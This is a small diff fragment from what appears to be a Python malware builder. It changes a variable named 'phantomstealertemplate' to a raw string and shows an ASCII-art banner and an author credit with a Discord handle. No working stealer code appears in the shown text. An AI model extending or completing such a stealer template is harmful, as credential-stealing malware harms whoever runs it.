@@ -16,7 +16,7 @@ __________.__                   __                           _________ __       
                                          
 """
 
-phantomstealertemplate = '''
+phantomstealertemplate = r'''
 # © Faith452, 2026
 # ==================================
 # Made by faith452, @y452 on Discord
